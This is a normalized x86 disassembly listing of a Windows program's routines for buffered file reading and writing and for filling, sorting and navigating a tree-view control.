mov [ esi + 0x14 ] ecx
jmp r-xdata
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x3c ]
push 0x0
lea eax [ esi + 0x14 ]
push eax
push ecx
push edx
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
mov [ esi + 0x10 ] eax
jne r-xdata
jg r-xdata
lea eax [ esi + 0x40 ]
mov [ esi + 0x1044 ] eax
mov [ esi + 0x1040 ] eax
pop esi
retn 0xc
call [ GetLastError@IAT ]
test eax eax
je r-xdata
test [ esi + 0x18 ] 0x2
je r-xdata
cmp ecx [ esi + 0x8 ]
jbe r-xdata
push r--data
lea eax [ esp + 0x14 ]
push eax
mov [ esp + 0x18 ] 0xfffffffb
call sub_4b5bd2
sub_41bcb0
push ebx
push ebp
mov ebp [ esp + 0x10 ]
mov ebx ecx
mov eax [ ebx + 0x1044 ]
push esi
mov esi [ ebx + 0x1040 ]
sub eax esi
cmp ebp eax
push edi
ja r-xdata
test eax eax
jbe r-xdata
mov edi [ esp + 0x14 ]
mov ecx ebp
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
add [ ebx + 0x1040 ] ebp
mov esi [ esp + 0x14 ]
mov edi [ esp + 0x14 ]
mov ecx eax
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebx + 0x10 ]
mov esi [ ebx + 0x14 ]
add edi eax
adc esi 0x0
mov [ ebx + 0x14 ] esi
mov esi [ esp + 0x14 ]
sub ebp eax
add esi eax
mov eax [ ebx + 0x1044 ]
mov [ ebx + 0x10 ] edi
mov [ ebx + 0x1040 ] eax
jmp r-xdata
mov ecx [ ebx + 0x3c ]
push 0x0
lea eax [ esp + 0x1c ]
push eax
push ebp
push esi
push ecx
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov ecx ebx
call sub_41bdb0
mov edx [ ebx ]
push ebp
push esi
mov ecx ebx
call [ edx + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
cmp ebp 0x1000
jae r-xdata
cmp [ esp + 0x18 ] ebp
je r-xdata
push r--data
lea edx [ esp + 0x18 ]
push edx
mov [ esp + 0x1c ] 0xfffffffa
call sub_4b5bd2
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x14 ]
pop edi
add ecx ebp
pop esi
adc eax 0x0
pop ebp
mov [ ebx + 0x10 ] ecx
mov [ ebx + 0x14 ] eax
pop ebx
retn 0x8
push r--data
lea eax [ esp + 0x18 ]
push eax
mov [ esp + 0x1c ] 0x1
call sub_4b5bd2
int3
sub_41bdb0
sub esp 0x8
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
mov edx [ esi + 0xc ]
cmp eax edx
mov ecx [ esi + 0x10 ]
mov ebx [ esi + 0x8 ]
push edi
lea edi [ esi + 0x40 ]
mov [ esi + 0x1044 ] edi
mov [ esi + 0x1040 ] edi
jl r-xdata
add ecx 0x1000
adc eax 0x0
cmp eax edx
jl r-xdata
jg r-xdata
mov eax 0x1000
jg r-xdata
push r--data
lea eax [ esp + 0x14 ]
push eax
mov [ esp + 0x18 ] 0x1
call sub_4b5bd2
cmp ecx ebx
jb r-xdata
mov ecx [ esp + 0xc ]
lea edx [ ecx + esi + 0x40 ]
pop edi
mov [ esi + 0x1044 ] edx
pop esi
pop ebx
add esp 0x8
retn
push r--data
lea eax [ esp + 0x14 ]
push eax
mov [ esp + 0x18 ] 0xfffffffa
call sub_4b5bd2
mov eax [ esi + 0x8 ]
sub eax [ esi + 0x10 ]
jmp r-xdata
cmp ecx ebx
jbe r-xdata
mov edx [ esi + 0x3c ]
push 0x0
lea ecx [ esp + 0x10 ]
push ecx
push eax
push edi
push edx
mov [ esp + 0x20 ] eax
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
sub_41be60
push esi
push edi
mov edi [ esp + 0x10 ]
push 0x0
lea eax [ esp + 0x14 ]
push eax
mov esi ecx
mov ecx [ esp + 0x14 ]
mov edx [ esi + 0x3c ]
push edi
push ecx
push edx
call [ WriteFile@IAT ]
cmp [ esp + 0x10 ] edi
je r-xdata
mov ecx [ esi + 0x10 ]
mov eax [ esi + 0x14 ]
mov edx [ esi + 0xc ]
add ecx edi
adc eax 0x0
cmp edx eax
mov [ esi + 0x10 ] ecx
mov [ esi + 0x14 ] eax
jg r-xdata
push r--data
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0x14 ] 0xfffffff9
call sub_4b5bd2
pop edi
pop esi
retn 0x8
jl r-xdata
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] eax
mov edx [ esi + 0x8 ]
cmp edx ecx
jae r-xdata
sub_41bed0
push ecx
push esi
mov esi ecx
mov eax [ esi ]
push edi
call [ eax + 0x14 ]
mov eax [ esi + 0x18 ]
test al 0x2
je r-xdata
test al 0x1
je r-xdata
test al 0x4
mov edi [ CreateFileA@IAT ]
jne r-xdata
mov eax [ esi + 0x3c ]
cmp eax 0xffffffff
jne r-xdata
cmp [ esi + 0x38 ] 0x10
jb r-xdata
cmp [ esi + 0x3c ] 0xffffffff
jne r-xdata
cmp [ esi + 0x38 ] 0x10
jb r-xdata
lea edx [ esi + 0xc ]
push edx
push eax
call [ GetFileSize@IAT ]
mov [ esi + 0x8 ] eax
lea eax [ esi + 0x40 ]
pop edi
mov [ esi + 0x1044 ] eax
mov [ esi + 0x1040 ] eax
pop esi
pop ecx
retn
push r--data
lea ecx [ esp + 0xc ]
push ecx
mov [ esp + 0x10 ] 0xfffffffd
call sub_4b5bd2
lea eax [ esi + 0x24 ]
mov eax [ esi + 0x24 ]
jmp r-xdata
cmp [ esi + 0x38 ] 0x10
jb r-xdata
lea eax [ esi + 0x24 ]
mov eax [ esi + 0x24 ]
jmp r-xdata
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
push eax
call [ CreateFileA@IAT ]
lea eax [ esi + 0x24 ]
mov eax [ esi + 0x24 ]
jmp r-xdata
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push 0xc0000000
push eax
call edi
mov [ esi + 0x3c ] eax
mov [ esi + 0x3c ] eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
push eax
call edi
jmp r-xdata
sub_41bfb0
push edi
mov edi ecx
mov ecx [ esp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ ecx ]
push esi
call [ eax + 0x8 ]
mov esi eax
test esi esi
jne r-xdata
xor al al
pop edi
retn 0x4
mov edx [ esi ]
mov ecx esi
call [ edx + 0xc ]
test eax eax
jne r-xdata
pop esi
xor al al
pop edi
retn 0x4
add esi 0x20
push esi
lea ecx [ edi + 0x20 ]
call sub_401200
neg eax
sbb eax eax
pop esi
inc eax
pop edi
retn 0x4
sub_41c020
push esi
mov esi ecx
mov eax [ esi + 0x3c ]
cmp eax 0xffffffff
mov [ esi ] r--data
je r-xdata
mov [ esi + 0x3c ] 0xffffffff
cmp [ esi + 0x38 ] 0x10
jb r-xdata
push eax
call [ CloseHandle@IAT ]
xor eax eax
mov [ esi + 0x38 ] 0xf
mov [ esi + 0x34 ] eax
mov [ esi + 0x24 ] al
mov [ esi ] r--data
pop esi
retn
mov eax [ esi + 0x24 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_41c070
push ebp
mov ebp esp
push 0xffffffff
push sub_4bfa6b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp esi edi
mov [ ebp - 0x10 ] esp
je r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
je r-xdata
push 0x1048
call sub_4b573e
add esp 0x4
cmp eax edi
jne r-xdata
push r--data
lea edx [ ebp - 0x1c ]
push edx
mov [ ebp - 0x1c ] 0xfffffffe
call sub_4b5bd2
push 0x28
call sub_4b573e
add esp 0x4
cmp eax edi
jne r-xdata
mov [ ebp + 0x8 ] eax
push esi
mov ecx eax
mov [ ebp - 0x4 ] edi
call sub_41bb20
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push r--data
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0x14 ] 0xfffffff6
call sub_4b5bd2
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x18 ]
mov [ eax + 0x4 ] edi
mov [ eax + 0x10 ] edi
mov [ eax + 0x14 ] edi
mov [ eax + 0x18 ] edi
mov [ eax ] r--data
mov [ eax + 0x20 ] esi
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] ecx
push r--data
lea ecx [ ebp - 0x18 ]
push ecx
mov [ ebp - 0x18 ] 0xfffffff6
call sub_4b5bd2
mov esi eax
cmp esi edi
mov [ ebp + 0x8 ] esi
jne r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ esi ]
mov ecx esi
mov [ esi + 0x18 ] eax
mov [ ebp - 0x4 ] 0x1
call [ edx + 0x10 ]
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
sub_41c190
mov eax [ esp + 0x4 ]
sub esp 0x28
test eax eax
je r-xdata
add esp 0x28
retn
mov ecx [ rw-data ]
mov [ esp + 0x4 ] eax
lea eax [ esp ]
push eax
push 0x0
push 0x110c
push ecx
mov [ esp + 0x10 ] 0x14
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
fild [ eax + 0x20 ]
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov edx [ esp + 0x28 ]
mov [ rw-data ] eax
fild [ edx + 0x24 ]
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov edx [ rw-data ]
mov [ rw-data ] eax
mov eax [ esp + 0x28 ]
mov ecx [ eax + 0x1c ]
push 0x0
push 0x0
dec ecx
push ecx
push edx
call sub_485220
add esp 0x14
sub_41c220
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
call sub_451930
add esp 0x4
retn
push ebx
mov ebx [ SendMessageA@IAT ]
push esi
push edi
push 0x0
push 0x0
push 0x1105
push eax
call ebx
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov eax [ rw-data ]
push 0x0
push 0x9
push 0x110a
push eax
call ebx
mov esi eax
test esi esi
jne r-xdata
mov ecx [ rw-data ]
push esi
push 0x4
push 0x110a
push ecx
call ebx
mov edi eax
test edi edi
jne r-xdata
mov esi 0xffff0000
push edi
call sub_41c190
mov edx [ rw-data ]
add esp 0x4
push edi
push 0x9
push 0x110b
push edx
call ebx
mov edx [ rw-data ]
push esi
push 0x1
push 0x110a
push edx
call ebx
mov edi eax
test edi edi
jne r-xdata
mov eax [ rw-data ]
push esi
push 0x3
push 0x110a
push eax
call ebx
mov esi eax
test esi esi
je r-xdata
push 0x0
call [ MessageBeep@IAT ]
pop edi
pop esi
pop ebx
retn
mov ecx [ rw-data ]
push esi
push 0x1
push 0x110a
push ecx
call ebx
mov edi eax
test edi edi
je r-xdata
sub_41c300
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
call sub_451930
add esp 0x4
retn
push esi
mov esi [ SendMessageA@IAT ]
push edi
push 0x0
push 0x0
push 0x1105
push eax
call esi
test eax eax
je r-xdata
pop edi
pop esi
mov eax [ rw-data ]
push 0x0
push 0x9
push 0x110a
push eax
call esi
mov ecx [ rw-data ]
mov edi eax
test edi edi
jne r-xdata
push edi
push 0x2
push 0x110a
push ecx
call esi
test eax eax
jne r-xdata
push eax
push 0x4
push 0x110a
push ecx
call esi
test eax eax
je r-xdata
push eax
push 0x4
mov edi eax
mov eax [ rw-data ]
push 0x110a
push eax
call esi
test eax eax
je r-xdata
mov edx [ rw-data ]
push edi
push 0x3
push 0x110a
push edx
call esi
mov edi eax
test edi edi
jne r-xdata
push 0x0
call [ MessageBeep@IAT ]
pop edi
pop esi
retn
jmp r-xdata
push edi
call sub_41c190
mov eax [ rw-data ]
add esp 0x4
push edi
push 0x9
push 0x110b
push eax
call esi
mov ecx [ rw-data ]
push eax
push 0x1
push 0x110a
push ecx
mov edi eax
call esi
test eax eax
jne r-xdata
mov edx [ rw-data ]
push eax
push 0x1
push 0x110a
push edx
mov edi eax
call esi
test eax eax
jne r-xdata
mov edx [ rw-data ]
push edi
push 0x4
push 0x110a
push edx
call esi
test eax eax
jne r-xdata
mov eax [ rw-data ]
push edi
push 0x4
push 0x110a
push eax
call esi
test eax eax
jne r-xdata
jmp r-xdata
sub_41c430
mov eax [ esp + 0x8 ]
mov ecx [ rw-data ]
sub esp 0x28
push ebx
push esi
push edi
mov edi [ SendMessageA@IAT ]
push eax
push 0x4
push 0x110a
push ecx
call edi
mov esi eax
test esi esi
je r-xdata
xor eax eax
mov ebx [ esp + 0x38 ]
jmp r-xdata
mov eax [ rw-data ]
lea edx [ esp + 0xc ]
push edx
push 0x0
push 0x110c
push eax
mov [ esp + 0x1c ] 0x54
mov [ esp + 0x20 ] esi
call edi
test eax eax
je r-xdata
test esi esi
jne r-xdata
mov ecx [ esp + 0x30 ]
cmp [ ecx + 0x1c ] ebx
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
add esp 0x28
retn
mov eax [ esp + 0x2c ]
test eax eax
jle r-xdata
mov edx [ rw-data ]
push esi
push 0x1
push 0x110a
push edx
call edi
mov esi eax
push esi
push ebx
call sub_41c430
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x28
retn
sub_41c4d0
mov edx [ esp + 0x4 ]
test edx edx
push esi
mov esi [ esp + 0xc ]
je r-xdata
xor eax eax
cmp edx esi
setg al
pop esi
retn 0xc
test esi esi
je r-xdata
mov eax [ edx + 0x1c ]
mov ecx [ esi + 0x1c ]
cmp eax ecx
jne r-xdata
xor edx edx
cmp eax ecx
setg dl
pop esi
mov eax edx
retn 0xc
mov eax [ edx + 0x24 ]
mov edx [ esi + 0x24 ]
xor ecx ecx
cmp eax edx
setg cl
pop esi
mov eax ecx
retn 0xc
sub_41c520
sub esp 0x18
push esi
push edi
mov edi [ esp + 0x28 ]
cmp edi 0x102
je r-xdata
pop edi
xor eax eax
pop esi
add esp 0x18
retn 0x10
cmp edi 0x20a
mov esi [ esp + 0x24 ]
jne r-xdata
mov edx [ esp + 0x30 ]
mov eax [ esp + 0x2c ]
mov ecx [ rw-data ]
push edx
push eax
push edi
push esi
push ecx
call [ CallWindowProcA@IAT ]
pop edi
pop esi
add esp 0x18
retn 0x10
lea eax [ esp + 0x10 ]
push eax
push esi
call [ GetWindowRect@IAT ]
lea ecx [ esp + 0x8 ]
push ecx
call [ GetCursorPos@IAT ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x10 ]
jl r-xdata
mov edx [ rw-data ]
push edx
call [ SetFocus@IAT ]
cmp eax [ esp + 0x18 ]
jg r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x14 ]
jl r-xdata
cmp eax [ esp + 0x1c ]
jg r-xdata
sub_41c5b0
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
sub esp 0x230
push ebx
mov ebx [ SendMessageA@IAT ]
push edi
push eax
push 0x4
push 0x110a
push ecx
call ebx
mov edi eax
test edi edi
je r-xdata
pop edi
pop ebx
add esp 0x230
retn
push ebp
mov ebp [ wsprintfA@IAT ]
push esi
mov esi [ esp + 0x248 ]
lea esp [ esp ]
mov eax [ rw-data ]
lea edx [ esp + 0x10 ]
push edx
push 0x0
push 0x110c
push eax
mov [ esp + 0x20 ] 0x54
mov [ esp + 0x24 ] edi
call ebx
test eax eax
je r-xdata
mov eax [ esp + 0x34 ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0x3c ]
push edx
mov ecx esi
call sub_401cc0
mov eax [ esp + 0x30 ]
test eax eax
jle r-xdata
mov edx [ eax + 0x20 ]
push ecx
mov ecx [ eax + 0x24 ]
mov eax [ eax + 0x1c ]
push ecx
push edx
push eax
lea ecx [ esp + 0x48 ]
push r--data
push ecx
call ebp
lea eax [ esp + 0x50 ]
add esp 0x18
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov eax [ rw-data ]
push edi
push 0x1
push 0x110a
push eax
call ebx
mov edi eax
test edi edi
je r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
pop esi
pop ebp
push 0x7c
push 0x1
mov ecx esi
call sub_4017f0
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx esi
call sub_401cc0
push esi
push edi
call sub_41c5b0
mov eax r--data
add esp 0x8
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx esi
call sub_401cc0
sub_41c6f0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bfa88
push eax
mov eax [ rw-data ]
mov [ fs : 0x0 ] esp
sub esp 0x1c
test eax eax
je r-xdata
mov ecx [ esp + 0x1c ]
mov [ fs : 0x0 ] ecx
add esp 0x28
retn
mov [ esp + 0x18 ] 0xf
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x4 ] 0x0
lea eax [ esp ]
push eax
push 0xffff0000
mov [ esp + 0x2c ] 0x0
call sub_41c5b0
add esp 0x8
push 0xffffffff
push 0x0
lea ecx [ esp + 0x8 ]
push ecx
mov ecx [ rw-data ]
add ecx 0x230
call sub_401dd0
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ esp + 0x18 ] 0x10
jb r-xdata
movzx edx [ rw-data ]
shl edx 0x10
or edx 0x1
push edx
push 0x1
push 0x406
push eax
call [ PostMessageA@IAT ]
mov eax [ esp + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_41c7b0
push 0xffffffff
push sub_4bfab3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x550
push ebx
push ebp
push esi
push edi
mov eax [ esp + 0x570 ]
mov ecx [ rw-data ]
push eax
push 0x4
push 0x110a
xor ebx ebx
push ecx
mov [ esp + 0x578 ] ebx
call [ SendMessageA@IAT ]
mov esi eax
cmp esi ebx
mov ebp 0x1
je r-xdata
cmp [ esp + 0x58c ] 0x10
jb r-xdata
mov eax [ rw-data ]
lea edx [ esp + 0x30 ]
push edx
push ebx
push 0x110c
push eax
mov [ esp + 0x40 ] 0x54
mov [ esp + 0x44 ] esi
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x560 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x55c
retn
mov edx [ esp + 0x578 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
cmp esi ebx
jne r-xdata
cmp [ rw-data ] ebx
mov edi [ esp + 0x54 ]
mov [ esp + 0x58 ] bl
je r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
cmp [ esp + 0x58c ] 0x10
mov eax [ esp + 0x578 ]
jae r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
push ebp
push eax
lea ecx [ esp + 0x268 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0x10
lea edx [ esp + 0x260 ]
push edx
lea eax [ esp + 0x5c ]
push eax
call [ lstrcatA@IAT ]
lea eax [ esp + 0x578 ]
mov edx [ rw-data ]
lea ecx [ esp + 0x30 ]
push ecx
push ebx
push 0x110d
lea eax [ esp + 0x64 ]
push edx
mov [ esp + 0x40 ] 0x11
mov [ esp + 0x54 ] 0x208
mov [ esp + 0x50 ] eax
call [ SendMessageA@IAT ]
cmp [ esp + 0x50 ] ebx
jle r-xdata
mov edx [ edi + 0x1c ]
push edx
lea eax [ esp + 0x464 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea ecx [ esp + 0x460 ]
push ecx
lea edx [ esp + 0x5c ]
push edx
call [ lstrcatA@IAT ]
push eax
lea ecx [ esp + 0x5c ]
push ecx
call [ lstrcatA@IAT ]
cmp [ rw-data ] ebx
je r-xdata
mov ecx [ rw-data ]
push esi
push 0x1
push 0x110a
push ecx
call [ SendMessageA@IAT ]
mov esi eax
inc ebp
push ebp
lea eax [ esp + 0x364 ]
push r--data
push eax
call [ wsprintfA@IAT ]
lea ecx [ esp + 0x36c ]
push ecx
lea edx [ esp + 0x584 ]
push edx
lea eax [ esp + 0x24 ]
push eax
call sub_402140
push ecx
mov ecx esp
mov [ esp + 0x48 ] esp
push 0xffffffff
push ebx
lea edx [ esp + 0x34 ]
mov edi 0xf
mov [ ecx + 0x18 ] edi
mov [ ecx + 0x14 ] ebx
push edx
mov [ esp + 0x590 ] 0x1
mov [ ecx + 0x4 ] bl
call sub_401dd0
push esi
call sub_41c7b0
mov eax [ esp + 0x48 ]
add esp 0x20
cmp eax 0x10
mov [ esp + 0x568 ] bl
jb r-xdata
mov [ esp + 0x28 ] edi
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] bl
mov eax [ esp + 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_41c9f0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ rw-data ]
push esi
push 0x0
push 0x1101
push eax
call [ SendMessageA@IAT ]
cmp [ rw-data ] esi
jne r-xdata
pop esi
jmp sub_41c6f0
mov [ rw-data ] 0xffff0000
sub_41ca30
sub esp 0x44
mov eax [ rw-data ]
push ebx
push ebp
push esi
push edi
xor ebx ebx
push 0x28
mov [ esp + 0x28 ] 0xffff0002
mov [ esp + 0x2c ] 0x26
mov [ esp + 0x24 ] eax
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] 0x1
call sub_4b573e
mov esi eax
add esp 0x4
cmp esi ebx
je r-xdata
xor eax eax
jmp r-xdata
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] ebx
lea ebp [ esi + 0x4 ]
mov [ ebp ] bl
mov ecx [ rw-data ]
mov edx [ rw-data ]
imul ecx ecx 0x70
lea eax [ ecx + edx ]
mov edx [ eax + 0x18 ]
mov ecx 0x10
cmp edx ecx
mov [ esp + 0x10 ] esi
jb r-xdata
mov edx [ rw-data ]
mov esi [ SendMessageA@IAT ]
lea ecx [ esp + 0x20 ]
push ecx
push ebx
push 0x1100
push edx
mov [ esp + 0x5c ] eax
call esi
mov edx [ rw-data ]
mov eax [ rw-data ]
lea ecx [ esp + 0x14 ]
push ecx
push ebx
push 0x1115
push edx
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] sub_41c4d0
mov [ esp + 0x2c ] ebx
call esi
call sub_41c6f0
sub esp 0x1c
mov ecx esp
mov eax r--data
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] ebx
mov [ esp + 0x2c ] esp
mov [ ecx + 0x4 ] bl
lea esi [ eax + 0x1 ]
lea edi [ eax + 0x4 ]
mov edi [ eax + 0x4 ]
jmp r-xdata
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax esi
push eax
push r--data
call sub_401e80
push 0xffff0000
call sub_41c7b0
add esp 0x20
pop edi
pop esi
pop ebp
pop ebx
add esp 0x44
retn
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp [ eax + 0x18 ] ecx
jb r-xdata
mov dl [ ecx ]
inc ecx
cmp dl bl
jne r-xdata
sub ecx edi
push ecx
push eax
mov ecx esi
call sub_401e80
mov eax [ esi + 0x14 ]
cmp eax 0x5
jb r-xdata
push eax
call sub_457f90
add esp 0x4
add eax edi
mov ecx eax
lea edi [ ecx + 0x1 ]
lea esp [ esp ]
mov eax [ rw-data ]
inc eax
mov [ esi + 0x1c ] eax
fild [ rw-data ]
push ecx
fdiv [ rw-data ]
fstp [ esp ]
call sub_452500
mov [ esi + 0x20 ] eax
fild [ rw-data ]
fdiv [ rw-data ]
fstp [ esp ]
call sub_452500
mov [ esi + 0x24 ] eax
mov eax [ esp + 0x14 ]
add esp 0x4
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov ecx ebp
mov ecx [ ebp ]
jmp r-xdata
lea ecx [ eax - 0x4 ]
cmp ecx eax
ja r-xdata
cmp [ ecx + eax - 0x4 ] 0x2e
jne r-xdata
sub ecx eax
push ebx
push ecx
mov ecx esi
call sub_4017f0
push 0xffffffff
push ecx
mov ecx esi
call sub_401ba0
jmp r-xdata
sub_41cbf0
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
push 0xffff0000
push eax
call sub_41c430
add esp 0x8
test eax eax
jne r-xdata
push 0x0
call sub_451930
add esp 0x4
push eax
call sub_41c9f0
add esp 0x4
xor eax eax
retn
call sub_41ca30
mov eax 0x1
retn
sub_41cc30
push 0xffffffff
push sub_4bfac8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
mov eax r--data
mov [ esp + 0x18 ] 0xf
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x4 ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x8 ]
call sub_401e80
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x50 ] 0x0
call sub_402340
push r--data
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x24 ] r--data
call sub_4b5bd2
int3
sub_41ccb0
sub esp 0x16c
mov edx [ rw-data ]
push ebx
mov ebx [ esp + 0x174 ]
push ebp
mov ebp [ SendMessageA@IAT ]
push esi
push edi
lea ecx [ esp + 0x1c ]
push ecx
push 0x0
push 0x110c
lea eax [ esp + 0x84 ]
push edx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x2c ] 0x7f
mov [ esp + 0x3c ] eax
mov [ esp + 0x40 ] 0x104
call ebp
mov ecx [ esp + 0x188 ]
mov eax [ esp + 0x184 ]
mov [ esp + 0x48 ] ecx
mov [ esp + 0x1c ] 0x3f
mov [ esp + 0x44 ] eax
mov ecx 0xa
lea esi [ esp + 0x1c ]
lea edi [ esp + 0x4c ]
[ edi ] [ esi ]
mov edi [ esp + 0x40 ]
push 0x28
call sub_4b573e
add esp 0x4
test eax eax
je r-xdata
xor esi esi
mov [ eax + 0x18 ] 0xf
mov [ eax + 0x14 ] 0x0
mov [ eax + 0x4 ] 0x0
mov esi eax
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x16c
retn
nop
push 0xffffffff
push 0x0
push edi
mov ecx esi
mov [ esp + 0x7c ] esi
call sub_401dd0
mov edx [ edi + 0x1c ]
mov [ esi + 0x1c ] edx
mov eax [ edi + 0x20 ]
lea edx [ esp + 0x44 ]
push edx
push 0x0
mov [ esi + 0x20 ] eax
mov eax [ rw-data ]
mov ecx [ edi + 0x24 ]
push 0x1100
push eax
mov [ esi + 0x24 ] ecx
call ebp
mov ecx [ rw-data ]
lea edx [ esp + 0x10 ]
push edx
push 0x0
mov edi eax
mov eax [ rw-data ]
push 0x1115
push eax
mov [ esp + 0x20 ] ecx
mov [ esp + 0x24 ] sub_41c4d0
mov [ esp + 0x28 ] 0x0
call ebp
mov ecx [ rw-data ]
push ebx
push 0x4
push 0x110a
push ecx
call ebp
mov esi eax
test esi esi
je r-xdata
push 0xffff0002
push edi
push esi
call sub_41ccb0
mov edx [ rw-data ]
add esp 0xc
push esi
push 0x1
push 0x110a
push edx
call ebp
mov esi eax
test esi esi
jne r-xdata
sub_41ce10
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
xor ecx ecx
cmp eax ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] ecx
jne r-xdata
cmp eax 0x3fffffff
jbe r-xdata
xor al al
pop esi
retn 0x4
push edi
lea edi [ eax * 4 ]
push edi
call sub_4b573e
add edi eax
add esp 0x4
mov [ esi + 0xc ] edi
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop edi
mov al 0x1
pop esi
retn 0x4
mov ecx esi
call sub_41cc30
sub_41ce70
push ebp
mov ebp esp
push 0xffffffff
push sub_4bfae0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ eax ]
push edi
mov edi [ esi + 0x4 ]
test edi edi
mov [ ebp - 0x10 ] esp
mov [ ebp + 0x10 ] ecx
jne r-xdata
mov eax [ esi + 0xc ]
sub eax edi
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test edi edi
jne r-xdata
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
test edi edi
jne r-xdata
mov ecx esi
call sub_41cc30
mov ebx 0x3fffffff
sub ebx ecx
cmp ebx edx
jae r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ ebp + 0x8 ]
mov eax ebx
sub eax edi
sar eax 0x2
cmp eax edx
jae r-xdata
mov ecx eax
